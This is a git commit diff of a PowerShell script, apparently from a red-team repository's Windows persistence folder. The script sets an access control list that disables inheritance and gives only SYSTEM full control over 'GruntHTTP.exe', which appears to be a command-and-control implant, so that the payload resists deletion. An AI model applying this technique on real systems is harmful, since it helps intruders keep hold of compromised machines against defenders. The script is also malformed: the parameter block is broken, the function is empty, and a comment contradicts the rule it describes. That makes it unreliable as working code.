0087d1c906fd52b255adc08298fbc0299e85ab40
megatop1 <43348736+megatop1@users.noreply.github.com>
2022-01-19 01:29:56 -0500

    Update and rename PreventDeletingPayloads.cmd to PreventDeletingPayloads.ps1

--- Windows/Persistence/PreventDeletingPayloads.ps1
+++ Windows/Persistence/PreventDeletingPayloads.ps1
@@ -1,13 +1,13 @@
 Function Set-FilePermissions {
 	Param(
 	$user,
-	$folder,
+	$folder)
 }
 
 $ACL = New-Object System.Security.AccessControl.DirectorySecurity #variable = new object 
 $ACL.SetAccessRuleProtection($true,$true) #disables inheritance. true true means off and off
 
-$rule1 = new-object System.Security.AccessControl.FileSystemAccessRule("$env:username", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
+$rule1 = new-object System.Security.AccessControl.FileSystemAccessRule("SYSTEM", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
 
 #include current user as having full access as well as the system to have full access
 $ACL.SetAccessRule($rule1)
@@ -15,4 +15,4 @@ $acl
 
 #Run this command not in ISE. This command sets permissions for specific rules using our script
 
-$ACL | Set-Acl -Path C:\Users\Administrator\Desktop\cat.txt
+$ACL | Set-Acl -Path C:\Users\GruntHTTP.exe
